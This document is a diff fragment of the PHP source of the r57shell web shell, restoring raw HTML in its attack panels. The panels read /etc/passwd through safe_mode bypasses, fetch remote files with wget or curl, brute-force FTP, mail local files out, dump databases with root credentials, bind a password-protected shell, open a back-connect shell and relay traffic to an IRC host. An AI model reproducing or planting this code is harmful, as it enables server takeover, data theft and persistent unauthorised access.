+echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['test5_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test5').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 if($safe_mode&&function_exists('imap_list')){
 echo $fs.$table_up1.$lang[$language.'_text113'].up_down('id23').$table_up2.div('id23').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text4'].$arrow."&lt;/b&gt;",in('text','test6_file',96,(!empty($_POST['test6_file'])?($_POST['test6_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test6').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test6_file',96,(!empty($_POST['test6_file'])?($_POST['test6_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test6').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 if($safe_mode&&function_exists('imap_body')){
 echo $fs.$table_up1.$lang[$language.'_text114'].up_down('id24').$table_up2.div('id24').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test7_file',96,(!empty($_POST['test7_file'])?($_POST['test7_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test7').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test7_file',96,(!empty($_POST['test7_file'])?($_POST['test7_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test7').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 if(@ini_get('file_uploads')){
-echo "&lt;form name=upload method=POST ENCTYPE=multipart/form-data&gt;";
+echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
 echo $table_up1.$lang[$language.'_text5'].up_down('id14').$table_up2.div('id14').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text6'].$arrow."&lt;/b&gt;",in('file','userfile',85,''));
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text21'].$arrow."&lt;/b&gt;",in('checkbox','nf1 id=nf1',0,'1').in('text','new_name',82,'').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile',85,''));
+echo sr(15,"<b>".$lang[$language.'_text21'].$arrow."</b>",in('checkbox','nf1 id=nf1',0,'1').in('text','new_name',82,'').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 if(!$safe_mode&&!$windows){
 echo $fs.$table_up1.$lang[$language.'_text15'].up_down('id15').$table_up2.div('id15').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text16'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"with\"&gt;&lt;option value=\"wget\"&gt;wget&lt;/option&gt;&lt;option value=\"fetch\"&gt;fetch&lt;/option&gt;&lt;option value=\"lynx\"&gt;lynx&lt;/option&gt;&lt;option value=\"links\"&gt;links&lt;/option&gt;&lt;option value=\"curl\"&gt;curl&lt;/option&gt;&lt;option value=\"GET\"&gt;GET&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir).ws(2)."&lt;b&gt;".$lang[$language.'_text17'].$arrow."&lt;/b&gt;".in('text','rem_file',78,'http://'));
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text18'].$arrow."&lt;/b&gt;",in('text','loc_file',105,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text16'].$arrow."</b>","<select size=\"1\" name=\"with\"><option value=\"wget\">wget</option><option value=\"fetch\">fetch</option><option value=\"lynx\">lynx</option><option value=\"links\">links</option><option value=\"curl\">curl</option><option value=\"GET\">GET</option></select>".in('hidden','dir',0,$dir).ws(2)."<b>".$lang[$language.'_text17'].$arrow."</b>".in('text','rem_file',78,'http://'));
+echo sr(15,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',105,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
+echo $te.'</div>'.$table_end1.$fe;
 }
 echo $fs.$table_up1.$lang[$language.'_text86'].up_down('id16').$table_up2.div('id16').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text59'].$arrow."&lt;/b&gt;",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt14']));
+echo sr(15,"<b>".$lang[$language.'_text59'].$arrow."</b>",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt14']));
 $arh = $lang[$language.'_text92'];
 if(@function_exists('gzcompress')) { $arh .= in('radio','compress',0,'zip').' zip';   }
 if(@function_exists('gzencode'))   { $arh .= in('radio','compress',0,'gzip').' gzip'; }
 if(@function_exists('bzcompress')) { $arh .= in('radio','compress',0,'bzip').' bzip'; }
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text91'].$arrow."&lt;/b&gt;",in('radio','compress',0,'none').' '.$arh);
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo sr(15,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none').' '.$arh);
+echo $te.'</div>'.$table_end1.$fe;
 if(@function_exists("ftp_connect")){
-echo $table_up1.$lang[$language.'_text93'].up_down('id17').$table_up2.div('id17').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=50%&gt;".$ts;
-echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text87']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text88'].$arrow."&lt;/b&gt;",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text37'].$arrow."&lt;/b&gt;",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text38'].$arrow."&lt;/b&gt;",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text89'].$arrow."&lt;/b&gt;",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_down'));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text18'].$arrow."&lt;/b&gt;",in('text','loc_file',45,$dir));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text90'].$arrow."&lt;/b&gt;","&lt;select name=ftp_mode&gt;&lt;option&gt;FTP_BINARY&lt;/option&gt;&lt;option&gt;FTP_ASCII&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
+echo $table_up1.$lang[$language.'_text93'].up_down('id17').$table_up2.div('id17').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
+echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text87']."</div></b></font>";
+echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
+echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
+echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
+echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_down'));
+echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
+echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
 echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt14']));
-echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=50%&gt;".$ts;
-echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text100']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text88'].$arrow."&lt;/b&gt;",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text37'].$arrow."&lt;/b&gt;",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text38'].$arrow."&lt;/b&gt;",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text18'].$arrow."&lt;/b&gt;",in('text','loc_file',45,$dir));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text89'].$arrow."&lt;/b&gt;",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_up'));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text90'].$arrow."&lt;/b&gt;","&lt;select name=ftp_mode&gt;&lt;option&gt;FTP_BINARY&lt;/option&gt;&lt;option&gt;FTP_ASCII&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
+echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
+echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text100']."</div></b></font>";
+echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
+echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
+echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
+echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
+echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_up'));
+echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
 echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt2']));
-echo $te."&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
+echo $te."</td>".$fe."</tr></div></table>";
 }
 if($unix && @function_exists("ftp_connect")){
 echo $fs.$table_up1.$lang[$language.'_text94'].up_down('id18').$table_up2.div('id18').$ts;
-echo sr(15,"&lt;b&gt;".$lang[$language.'_text88'].$arrow."&lt;/b&gt;",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
-echo sr(15,"","&lt;font face=Verdana size=-2&gt;".$lang[$language.'_text99']." ( &lt;a href=".$_SERVER['PHP_SELF']."?users&gt;".$lang[$language.'_text95']."&lt;/a&gt; )&lt;/font&gt;");
+echo sr(15,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
+echo sr(15,"","<font face=Verdana size=-2>".$lang[$language.'_text99']." ( <a href=".$_SERVER['PHP_SELF']."?users>".$lang[$language.'_text95']."</a> )</font>");
 echo sr(15,"",in('checkbox','reverse id=reverse',0,'1').$lang[$language.'_text101']);
-echo $te.'&lt;/div&gt;'.$table_end1.$fe;
+echo $te.'</div>'.$table_end1.$fe;
 }
 if(@function_exists("mail")){
-echo $table_up1.$lang[$language.'_text102'].up_down('id19').$table_up2.div('id19').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=50%&gt;".$ts;
-echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text103']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text105'].$arrow."&lt;/b&gt;",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("piero@kralpalace.org"))).in('hidden','cmd',0,'mail').in('hidden','dir',0,$dir));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text106'].$arrow."&lt;/b&gt;",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text107'].$arrow."&lt;/b&gt;",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("hello billy"))));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text108'].$arrow."&lt;/b&gt;",'&lt;textarea name=text cols=33 rows=2&gt;'.(!empty($_POST['text'])?($_POST['text']):("mail text here")).'&lt;/textarea&gt;');
+echo $table_up1.$lang[$language.'_text102'].up_down('id19').$table_up2.div('id19').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
+echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text103']."</div></b></font>";
+echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("piero@kralpalace.org"))).in('hidden','cmd',0,'mail').in('hidden','dir',0,$dir));
+echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
+echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("hello billy"))));
+echo sr(25,"<b>".$lang[$language.'_text108'].$arrow."</b>",'<textarea name=text cols=33 rows=2>'.(!empty($_POST['text'])?($_POST['text']):("mail text here")).'</textarea>');
 echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
-echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=50%&gt;".$ts;
-echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text104']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text105'].$arrow."&lt;/b&gt;",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("piero@kralpalace.org"))).in('hidden','cmd',0,'mail_file').in('hidden','dir',0,$dir));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text106'].$arrow."&lt;/b&gt;",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text107'].$arrow."&lt;/b&gt;",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("file from r57shell"))));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text18'].$arrow."&lt;/b&gt;",in('text','loc_file',45,$dir));
-echo sr(25,"&lt;b&gt;".$lang[$language.'_text91'].$arrow."&lt;/b&gt;",in('radio','compress',0,'none').' '.$arh);
+echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
+echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text104']."</div></b></font>";
+echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("piero@kralpalace.org"))).in('hidden','cmd',0,'mail_file').in('hidden','dir',0,$dir));
+echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
+echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("file from r57shell"))));
+echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
+echo sr(25,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none').' '.$arh);
 echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
-echo $te."&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
+echo $te."</td>".$fe."</tr></div></table>";
 }
 if($mysql_on||$mssql_on||$pg_on||$ora_on)
 {
-$select = '&lt;select name=db&gt;';
-if($mysql_on) $select .= '&lt;option&gt;MySQL&lt;/option&gt;';
-if($mssql_on) $select .= '&lt;option&gt;MSSQL&lt;/option&gt;';
-if($pg_on)    $select .= '&lt;option&gt;PostgreSQL&lt;/option&gt;';
-if($ora_on)   $select .= '&lt;option&gt;Oracle&lt;/option&gt;';
-$select .= '&lt;/select&gt;';
-echo $table_up1.$lang[$language.'_text82'].up_down('id20').$table_up2.div('id20').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=50%&gt;".$ts;
-echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text40']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
-echo sr(35,"&lt;b&gt;".$lang[$language.'_text80'].$arrow."&lt;/b&gt;",$select);
-echo sr(35,"&lt;b&gt;".$lang[$language.'_text111'].$arrow."&lt;/b&gt;",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' &lt;b&gt;:&lt;/b&gt; '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
-echo sr(35,"&lt;b&gt;".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."&lt;/b&gt;",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' &lt;b&gt;:&lt;/b&gt; '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
-echo sr(35,"&lt;b&gt;".$lang[$language.'_text36'].$arrow."&lt;/b&gt;",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))).' &lt;b&gt;.&lt;/b&gt; '.in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"))));
-echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump')."&lt;b&gt;".$lang[$language.'_text41'].$arrow."&lt;/b&gt;",in('checkbox','dif id=dif',0,'1').in('text','dif_name',31,(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"))));
+$select = '<select name=db>';
+if($mysql_on) $select .= '<option>MySQL</option>';
+if($mssql_on) $select .= '<option>MSSQL</option>';
+if($pg_on)    $select .= '<option>PostgreSQL</option>';
+if($ora_on)   $select .= '<option>Oracle</option>';
+$select .= '</select>';
+echo $table_up1.$lang[$language.'_text82'].up_down('id20').$table_up2.div('id20').$ts."<tr>".$fs."<td valign=top width=50%>".$ts;
+echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text40']."</div></b></font>";
+echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
+echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
+echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
+echo sr(35,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))).' <b>.</b> '.in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"))));
+echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump')."<b>".$lang[$language.'_text41'].$arrow."</b>",in('checkbox','dif id=dif',0,'1').in('text','dif_name',31,(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"))));
 echo sr(35,"",in('submit','submit',0,$lang[$language.'_butt9']));
-echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=50%&gt;".$ts;
-echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text83']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
-echo sr(35,"&lt;b&gt;".$lang[$language.'_text80'].$arrow."&lt;/b&gt;",$select);
-echo sr(35,"&lt;b&gt;".$lang[$language.'_text111'].$arrow."&lt;/b&gt;",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' &lt;b&gt;:&lt;/b&gt; '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
-echo sr(35,"&lt;b&gt;".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."&lt;/b&gt;",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' &lt;b&gt;:&lt;/b&gt; '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
-echo sr(35,"&lt;b&gt;".$lang[$language.'_text39'].$arrow."&lt;/b&gt;",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
-echo sr(35,"&lt;b&gt;".$lang[$language.'_text84'].$arrow."&lt;/b&gt;".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),"");
-echo $te."&lt;div align=center id='n'&gt;&lt;textarea cols=55 rows=1 name=db_query&gt;".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES; SELECT * FROM user; SELECT version(); select user();"))."&lt;/textarea&gt;&lt;br&gt;".in('submit','submit',0,$lang[$language.'_butt1'])."&lt;/div&gt;&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
+echo $te."</td>".$fe.$fs."<td valign=top width=50%>".$ts;
+echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text83']."</div></b></font>";
+echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
+echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
+echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
+echo sr(35,"<b>".$lang[$language.'_text39'].$arrow."</b>",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
+echo sr(35,"<b>".$lang[$language.'_text84'].$arrow."</b>".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),"");
+echo $te."<div align=center id='n'><textarea cols=55 rows=1 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES; SELECT * FROM user; SELECT version(); select user();"))."</textarea><br>".in('submit','submit',0,$lang[$language.'_butt1'])."</div></td>".$fe."</tr></div></table>";
 }
 if(!$safe_mode&&!$windows){
-echo $table_up1.$lang[$language.'_text81'].up_down('id21').$table_up2.div('id21').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=34%&gt;".$ts;
-echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text9']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
-echo sr(40,"&lt;b&gt;".$lang[$language.'_text10'].$arrow."&lt;/b&gt;",in('text','port',15,'11457'));
-echo sr(40,"&lt;b&gt;".$lang[$language.'_text11'].$arrow."&lt;/b&gt;",in('text','bind_pass',15,'r57'));
-echo sr(40,"&lt;b&gt;".$lang[$language.'_text20'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"use\"&gt;&lt;option value=\"Perl\"&gt;Perl&lt;/option&gt;&lt;option value=\"C\"&gt;C&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
+echo $table_up1.$lang[$language.'_text81'].up_down('id21').$table_up2.div('id21').$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
+echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text9']."</div></b></font>";
+echo sr(40,"<b>".$lang[$language.'_text10'].$arrow."</b>",in('text','port',15,'11457'));
+echo sr(40,"<b>".$lang[$language.'_text11'].$arrow."</b>",in('text','bind_pass',15,'r57'));
+echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
 echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt3']));
-echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=33%&gt;".$ts;
-echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text12']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
-echo sr(40,"&lt;b&gt;".$lang[$language.'_text13'].$arrow."&lt;/b&gt;",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
-echo sr(40,"&lt;b&gt;".$lang[$language.'_text14'].$arrow."&lt;/b&gt;",in('text','port',15,'11457'));
-echo sr(40,"&lt;b&gt;".$lang[$language.'_text20'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"use\"&gt;&lt;option value=\"Perl\"&gt;Perl&lt;/option&gt;&lt;option value=\"C\"&gt;C&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
+echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
+echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text12']."</div></b></font>";
+echo sr(40,"<b>".$lang[$language.'_text13'].$arrow."</b>",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
+echo sr(40,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','port',15,'11457'));
+echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
 echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
-echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=33%&gt;".$ts;
-echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text22']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
-echo sr(40,"&lt;b&gt;".$lang[$language.'_text23'].$arrow."&lt;/b&gt;",in('text','local_port',15,'11457'));
-echo sr(40,"&lt;b&gt;".$lang[$language.'_text24'].$arrow."&lt;/b&gt;",in('text','remote_host',15,'irc.dalnet.ru'));
-echo sr(40,"&lt;b&gt;".$lang[$language.'_text25'].$arrow."&lt;/b&gt;",in('text','remote_port',15,'6667'));
-echo sr(40,"&lt;b&gt;".$lang[$language.'_text26'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"use\"&gt;&lt;option value=\"Perl\"&gt;datapipe.pl&lt;/option&gt;&lt;option value=\"C\"&gt;datapipe.c&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
+echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
+echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text22']."</div></b></font>";
+echo sr(40,"<b>".$lang[$language.'_text23'].$arrow."</b>",in('text','local_port',15,'11457'));
